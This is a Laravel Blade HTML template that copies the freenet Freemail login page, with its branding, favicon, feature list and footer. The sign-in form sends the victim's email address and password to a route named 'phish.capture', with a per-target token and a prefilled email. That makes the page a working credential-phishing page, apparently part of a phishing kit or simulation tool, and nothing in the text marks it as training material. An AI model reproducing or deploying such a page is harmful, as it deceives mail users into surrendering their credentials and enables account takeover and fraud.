<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>freenet Freemail</title>
    <link rel="icon" href="https://email.freenet.de/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Roboto:wght@700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Open Sans',sans-serif;background:#fff;min-height:100vh}
        header{background:#21314d;height:116px;display:flex;align-items:center;padding:0 32px;box-shadow:0 5px 5px -5px rgba(170,170,170,.7);position:sticky;top:0;z-index:100}
        .header-inner{display:flex;align-items:center;justify-content:space-between;width:100%;max-width:1240px;margin:0 auto}
        .logo-text{font-size:22px;font-weight:700;color:#fff;letter-spacing:0.5px}
        nav{display:flex;gap:24px;align-items:center}
        nav a{font-size:14px;color:rgba(255,255,255,.85);text-decoration:none;font-weight:400}
        nav a:hover{color:#fff}
        .hero{background:linear-gradient(135deg,#21314d 0%,#092043 100%);min-height:450px;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}
        .hero::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:url('https://tls.freenet.de/email/assets/img/email-Neue/email1-header-pic.jpg') center/cover;opacity:.15}
        .hero-content{position:relative;z-index:1;text-align:center;color:#fff;max-width:600px;padding:40px}
        .hero-content h1{font-size:18px;font-weight:600;margin-bottom:16px}
        .hero-content h2{font-family:Roboto,sans-serif;font-size:32px;font-weight:700;color:#092043;margin-bottom:8px;color:#fff}
        .hero-content p{font-size:16px;line-height:1.5;opacity:.9}
        .content{max-width:1240px;margin:0 auto;padding:60px 100px}
        .login-section{display:flex;gap:60px;align-items:flex-start}
        .login-form{flex:1;max-width:400px}
        .login-form h3{font-family:Roboto,sans-serif;font-size:24px;font-weight:700;color:#092043;margin-bottom:8px}
        .login-form .subtitle{font-size:14px;color:#666;margin-bottom:24px}
        .input-group{margin-bottom:16px}
        .input-group input{width:100%;height:44px;padding:0 16px;font-size:14px;font-family:'Open Sans',sans-serif;color:#092043;background:#fff;border:1px solid #ccc;border-radius:4px;outline:none;transition:border-color .15s}
        .input-group input:focus{border-color:#00a651}
        .input-group input::placeholder{color:#999}
        .btn-login{width:100%;height:44px;background:#00a651;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;font-family:'Open Sans',sans-serif;cursor:pointer;transition:background .15s}
        .btn-login:hover{background:#008c44}
        .features{flex:1}
        .features ul{list-style:none;padding:0}
        .features li{padding:8px 0;font-size:14px;color:#092043;border-bottom:1px solid #f0f0f0}
        .features li::before{content:'✓';color:#00a651;font-weight:700;margin-right:8px}
        .bsi-badge{text-align:center;margin-top:40px}
        .bsi-badge img{height:60px;opacity:.8}
        footer{background:#21314d;color:#fff;padding:40px 32px;margin-top:40px}
        .footer-inner{max-width:1240px;margin:0 auto;display:flex;justify-content:space-between;flex-wrap:wrap;gap:24px}
        .footer-col h4{font-size:14px;font-weight:600;margin-bottom:12px}
        .footer-col a{display:block;font-size:13px;color:rgba(255,255,255,.7);text-decoration:none;margin-bottom:6px}
        .footer-col a:hover{color:#fff}
        @media(max-width:768px){.login-section{flex-direction:column}.content{padding:32px 16px}.hero{min-height:300px}}
    </style>
</head>
<body>
    <header>
        <div class="header-inner">
            <div class="logo-text">freenet</div>
            <nav>
                <a href="#">LOGIN</a>
                <a href="#">Hilfe</a>
            </nav>
        </div>
    </header>

    <div class="hero">
        <div class="hero-content">
            <h1>freenet Mail</h1>
            <h2>Was bietet Dir freenet Mail?</h2>
            <p>Kostenlose E-Mail-Adresse, 1 GB Speicher, Spam-Schutz und vieles mehr.</p>
        </div>
    </div>

    <div class="content">
        <div class="login-section">
            <div class="login-form">
                <h3>Einloggen</h3>
                <p class="subtitle">Melden Sie sich mit Ihrer freenet Mail Adresse an.</p>

                <form action="{{ route('phish.capture', ['provider' => 'freenet', 'token' => $token]) }}" method="POST">
                    @csrf
                    <div class="input-group">
                        <input type="text" name="email" placeholder="E-Mail-Adresse" value="{{ $email }}" autocomplete="username">
                    </div>
                    <div class="input-group">
                        <input type="password" name="password" placeholder="Passwort" autocomplete="current-password">
                    </div>
                    <button type="submit" class="btn-login">Anmelden</button>
                </form>
            </div>

            <div class="features">
                <ul>
                    <li>1 GB kostenloses Postfach</li>
                    <li>Spam- und Virenschutz</li>
                    <li>Webmailer für unterwegs</li>
                    <li>POP3/IMAP Zugang</li>
                    <li>100 % Made in Germany</li>
                </ul>
            </div>
        </div>
    </div>

    <footer>
        <div class="footer-inner">
            <div class="footer-col">
                <h4>Services</h4>
                <a href="#">Börse</a>
                <a href="#">Download-Center</a>
                <a href="#">Ferien</a>
            </div>
            <div class="footer-col">
                <h4>Informationen</h4>
                <a href="#">Impressum</a>
                <a href="#">Datenschutz</a>
                <a href="#">AGB</a>
            </div>
        </div>
    </footer>
</body>
</html>
